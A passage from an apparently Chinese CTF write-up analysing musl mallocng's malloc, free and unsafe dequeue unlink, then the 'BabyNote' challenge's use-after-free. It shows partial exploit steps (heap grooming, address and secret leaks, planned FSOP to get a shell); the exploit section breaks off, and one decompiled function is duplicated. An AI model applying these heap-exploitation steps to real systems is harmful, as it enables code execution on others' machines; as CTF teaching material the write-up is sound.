class="line">munmap(p, needed);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g-&gt;mem = p;</span><br><span class="line">g-&gt;mem-&gt;meta = g;</span><br><span class="line">g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line"><span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">ctx.mmap_counter++;</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;<span class="comment">// 这上面就是验证是否超过最大size以及是否使用mmap进行申请空间</span></span><br><span class="line"></span><br><span class="line">sc = size_to_class(n);<span class="comment">// 将size转化成对应的size_classes的下标</span></span><br><span class="line"></span><br><span class="line">rdlock();</span><br><span class="line">g = ctx.active[sc];<span class="comment">// 取出对应sc的meta</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line"><span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line"><span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line"><span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line">    <span class="comment">// 没找到对应的meta 会执行下面的if语句</span></span><br><span class="line"><span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line"><span class="keyword">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line"><span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line"><span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line"><span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">usage += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">sc |= <span class="number">1</span>;</span><br><span class="line">g = ctx.active[sc];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;<span class="comment">// 寻找对应size的maeta的group可用的chunk</span></span><br><span class="line">mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">first = mask&amp;-mask;</span><br><span class="line"><span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">g-&gt;avail_mask = mask-first;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">idx = a_ctz_32(first);</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">upgradelock();</span><br><span class="line"></span><br><span class="line">idx = alloc_slot(sc, n);<span class="comment">// 使用alloc_slot寻找idx</span></span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line">ctr = ctx.mmap_counter;</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">return</span> enframe(g, idx, n, ctr);<span class="comment">// 取出chunk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面总结一下：</p><pre><code> 1. 首先是判断size，是否超过限制，或者是否超过阀值 2. 若是size没有超过阀值，则会在active里找对应size的meta 3. 如果active对应size的meta 位置上为空，没找到那么尝试先找size更大的meta 4. 如果active对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk 5. 如果有空闲的chunk，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr); 6. 从对应meta 中的group 取出 第idx号chunk分配 7. 如果没有，break 跳出循环 8. 跳出循环后执行`idx = alloc_slot(sc, n);`     1. 使用group中被free的chunk     2. 从队列中其他meta的group 中找     3. 如果都不行就重新分配一个新的group 对应一个新的meta 9. enframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk</code></pre><h4 id="free"><a href="#free" class="headerlink" title="free"></a><strong>free</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);<span class="comment">// 得到chunk对应的meta</span></span><br><span class="line"><span class="keyword">int</span> idx = get_slot_index(p);<span class="comment">// 得到idx</span></span><br><span class="line"><span class="keyword">size_t</span> stride = get_stride(g);<span class="comment">// 找到size_classes中对应chunk的size</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *end = start + stride - IB;</span><br><span class="line">get_nominal_size(p, end);<span class="comment">// 算出chunk的真实大小</span></span><br><span class="line"><span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line"><span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line"><span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">*(<span class="keyword">uint16_t</span> *)((<span class="keyword">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line"><span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="keyword">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="keyword">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *base = start + (-(<span class="keyword">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line"><span class="keyword">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line"><span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line"><span class="keyword">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line"><span class="keyword">uint32_t</span> mask = freed | avail; <span class="comment">// 将free的chunk加进去</span></span><br><span class="line">assert(!(mask&amp;self));</span><br><span class="line"><span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (!MT)</span><br><span class="line">g-&gt;freed_mask = freed+self;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下：</p><pre><code> 1. 通过get_meta(p)得到meta，通过get_slot_index(p)得到对应chunk的 idx -&gt; 通过get_nominal_size(p, end) 算出真实大小 2. 重置idx 和 offset idx 被置为0xff 标记chunk， 修改freed_mask 标记chunk被释放 3. 最后调用nontrivial_free 完成关于meta一些剩余操作</code></pre><blockquote><p>仔细观察分配的过程，我们也可以看出为什么free 的chunk不能立即回收使用，因为有空闲的chunk的时候，分配chunk是直接设置meta-&gt;avail_mask</p><p>然后直接enframe() 直接从group中取出 chunk即可，不会设置meta-&gt;freed</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct meta *<span class="title">get_meta</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">assert(!((<span class="keyword">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line"><span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line"><span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">assert(!offset);</span><br><span class="line">offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - UNIT*offset - UNIT);<span class="comment">// 通过offset 和chunk 地址计算出group地址</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;<span class="comment">// 得到meta地址</span></span><br><span class="line">assert(meta-&gt;mem == base);<span class="comment">// 检查meta 是否指向对应的group</span></span><br><span class="line">assert(index &lt;= meta-&gt;last_idx);<span class="comment">// 检查chunk idx 是否超过 meta 最大chunk 容量</span></span><br><span class="line">assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);<span class="comment">// 得到meta_area 地址</span></span><br><span class="line">assert(area-&gt;check == ctx.secret);<span class="comment">// 检查 check 校验值</span></span><br><span class="line"><span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;<span class="comment">// 检查是否属于 sizeclasses 管理的chunk 大小</span></span><br><span class="line">assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (struct meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line"><span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">        <span class="comment">// 要么释放要么可用，且该meta可以被释放</span></span><br><span class="line"><span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line"><span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">            <span class="comment">// 如果队列中 有下一个meta</span></span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">            <span class="comment">// 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta</span></span><br><span class="line"><span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">activate_group(ctx.active[sc]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="comment">// might still be active if there were no allocations</span></span><br><span class="line"><span class="comment">// after last available slot was taken.</span></span><br><span class="line"><span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line"><span class="keyword">return</span> (struct mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line"><span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*phead = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在不安全的解链操作了</p><p>可以看到没有任何的安全检测就直接往prev写入值了。那么这里进入到dequeue的条件主要有两点：</p><ul><li>第一种:如果一个group 中所有的chunk 都已经被使用，且没有free掉的chunk</li><li>第二种:group 中的chunk 当free掉最后一个chunk，都处于freed的状态</li></ul><h2 id="BabyNote"><a href="#BabyNote" class="headerlink" title="BabyNote"></a>BabyNote</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这道题的逆向过程也不是很难，可以知道题目维护的是一个单链表的结构</p><p>在比赛期间没发现这道题的漏洞，看了wp发现我少考虑了一种极端情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_16A1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 *i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0LL</span>;</span><br><span class="line">  v3 = give_name((__int64 *)&amp;v1);</span><br><span class="line">  ptr = (<span class="keyword">void</span> *)_int_find(v1, v3);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptr != (<span class="keyword">void</span> *)chunk_start || *(_QWORD *)(chunk_start + <span class="number">0x20</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_QWORD *)ptr + <span class="number">4</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = &amp;chunk_start; ptr != (<span class="keyword">void</span> *)*i; i = (__int64 *)(*i + <span class="number">0x20</span>) )</span><br><span class="line">          ;</span><br><span class="line">        *i = *((_QWORD *)ptr + <span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      chunk_start = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)ptr);</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oops.....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;<span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_16A1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 *i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0LL</span>;</span><br><span class="line">  v3 = give_name((__int64 *)&amp;v1);</span><br><span class="line">  ptr = (<span class="keyword">void</span> *)_int_find(v1, v3);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptr != (<span class="keyword">void</span> *)chunk_start || *(_QWORD *)(chunk_start + <span class="number">0x20</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_QWORD *)ptr + <span class="number">4</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = &amp;chunk_start; ptr != (<span class="keyword">void</span> *)*i; i = (__int64 *)(*i + <span class="number">0x20</span>) )</span><br><span class="line">          ;</span><br><span class="line">        *i = *((_QWORD *)ptr + <span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      chunk_start = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)ptr);</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oops.....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是当最后一个结点(也是第一个生成的结点)被删除的时候，倒数第二个结点(也就是第二个生成的结点)的next指针还是会指向最后一个结点，这也就造成了UAF</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>首先生成UAF的chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220510102335264.png" alt="image-20220510102335264"></p><p>可以看到其实已经是造成了UAF了</p><p>这个时候我们如果在free的chunk这里生成一个管理堆块即可泄漏出堆地址，但是上面提到了musl在free后不会直接该表avail的值，而是等avail用完了才会根据freed修改avail。</p><p><img src="/images/image-20220510103046917.png" alt="image-20220510103046917"></p><p>可以看到当前的meta，题目的show函数也是会创建chunk然后free掉的，所以修改掉即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220510103350652.png" alt="image-20220510103350652"></p><p>那么下一次申请的管理堆块就会是我们上面的内容堆块</p><p>我发现如果单纯的按照上面的操作会出现后面生成的管理堆会覆盖掉以前的管理堆导致破坏了UAF，所以我在前面新增了一段代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;d&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="string">b&#x27;d&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220510105155095.png" alt="image-20220510105155095"></p><p>从而达到这种效果，使我们造成UAF的管理堆块在group的最后，避免覆盖</p><p><img src="/images/image-20220510105526734.png" alt="image-20220510105526734"></p><p>接着进行上面的步骤即可实现这一效果</p><p><img src="/images/image-20220510110419373.png" alt="image-20220510110419373"></p><p>紧接着泄漏地址</p><p>根据上面描述的，我们最终利用的其实是dequeue当中的任意地址写，但是在进入这个函数之前会检测secrt值，所以我们还需要泄漏一次，这次泄漏的思路和上面差不多，这里可以通过show函数修改掉我们最开始管理堆块即可进行泄漏。</p><p>到这里已经泄漏完所有的东西了，下一步就是伪造IO_FILE进行FSOP来getshell了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 